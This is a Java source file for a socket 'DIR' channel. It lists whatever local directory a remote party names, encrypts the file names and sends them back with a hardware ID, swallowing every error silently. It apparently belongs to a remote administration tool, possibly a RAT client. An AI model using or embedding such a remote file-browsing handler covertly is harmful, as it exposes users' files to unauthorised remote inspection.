package de.dion.socket.localobjects.channel.channels;

import java.io.File;
import java.util.Collection;
import java.util.LinkedList;

import de.dion.socket.localobjects.channel.Channel;
import de.dion.socket.objects.DataPackage;
import de.dion.socket.utils.StringHelper;

public class DIR extends Channel {

	public DIR() {
		super("DIR");
	}

	@Override
	public void onSocketReceive(DataPackage pack) {
		
		try {
			if(pack.size() > 0)
			{
				String dir = (String) pack.get(0);
				File f = null;
				if(dir.equals(""))
				{
					f = new File(".");
				}
				else
				{
					f = new File(dir);
				}
				if(f.exists() && f.isDirectory())
				{
					LinkedList<String> list = new LinkedList<>();
					try {
						for(String kk: f.list())
						{
							try {
								list.add(StringHelper.crypt(kk));
							} catch(Exception e) {}
						}
					} catch(Exception e) {}
					sendLS(list, f.getCanonicalPath(), false);
				}
				else
				{
					sendLS(null, "Kein guelltiges Verzeichnis -> " + f.getCanonicalPath(), true);
				}
			}
		} catch (Exception e) {}
		
	}
	
	private void sendLS(Collection<String> col, String dir, boolean error)
	{
		DataPackage dp = new DataPackage("DIR", HWID, col, dir, error);
		sendDataPackage(dp);
	}

}
